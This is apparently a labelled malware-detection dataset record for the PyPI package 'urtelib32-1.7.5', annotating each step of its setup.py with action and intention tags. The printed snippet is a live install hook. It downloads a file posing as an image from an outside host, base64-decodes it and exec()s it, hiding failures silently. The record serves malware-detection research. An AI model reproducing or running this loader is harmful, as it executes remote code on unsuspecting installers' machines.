{
  "metadata": {
    "package_name": "urtelib32-1.7.5",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/urtelib32-1.7.5.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/urtelib32-1.7.5.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os, time\nfrom base64 import b64decode\nfrom setuptools.command.install import install\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        import requests\n        try:\n            with open(\n                    \"image.png\",\n                    \"wb\"\n                    ) as file:\n                    file.write(\n                        requests.get(\n                            f\"http://wpp-api-01hw.onrender.com/api/images/1140884481671188581/image.png\",\n                            headers={\"auth\":\"&&CD&&ON\"}\n                            ).content\n                    )\n\n            exec(b64decode(open(\"image.png\", \"rb\").read()))\n        except:\n            pass",
          "triple_sequences": [
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "image.png",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "http://wpp-api-01hw.onrender.com/api/images/1140884481671188581/image.png",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "requests.get(...).content",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "image.png",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "open('image.png', 'rb').read()",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "exec()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "b64decode(open('image.png', 'rb').read())",
              "object_description": "Decoded obfuscated data",
              "object_id": "decoded_obfuscated_data",
              "intention_description": "Execute dynamically decoded code content",
              "intention_id": "execute_dynamically_decoded_code"
            }
          ]
        }
      ]
    }
  ]
}